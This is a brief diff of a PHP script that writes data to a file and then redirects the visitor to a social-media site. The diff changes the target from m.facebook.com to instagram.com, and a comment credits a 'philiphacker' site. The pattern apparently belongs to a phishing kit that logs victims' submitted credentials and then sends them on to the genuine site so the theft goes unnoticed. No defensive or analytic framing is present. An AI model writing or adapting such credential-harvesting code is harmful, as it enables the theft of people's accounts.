@@ -12,7 +12,7 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:http://m.facebook.com");
+header("location:http://instagram.com");
 exit;
 // www.philiphacker.in
 ?>
